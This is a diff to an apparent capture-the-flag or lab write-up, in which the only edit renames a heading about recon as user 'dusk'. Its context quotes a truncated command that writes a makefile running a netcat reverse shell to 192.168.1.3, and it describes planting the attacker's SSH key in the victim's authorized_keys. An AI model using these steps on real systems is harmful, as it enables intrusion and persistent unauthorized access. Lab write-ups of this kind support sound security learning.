@@ -146,7 +146,7 @@ I created a makefile for a reverse netcat using `printf "all:\n\tnc 192.168.1.3 
 
 I went to the home dir for dusk, created .ssh/authorized_keys with my kali's public ssh key, chmod 644 for authorized_keys and chmod 700 for .ssh, and finally was able to remotely ssh in for a proper shell.
 
-## Recon as dusk and win!
+## Recon as dusk, docker and win!
 
 dusk couldn't run sudo -l. There was also nothing in their user dir of use. I used a find command to find everything they owned and their was nothing useful. Their mail inbox contained only a test email I had sent the previous day.
 
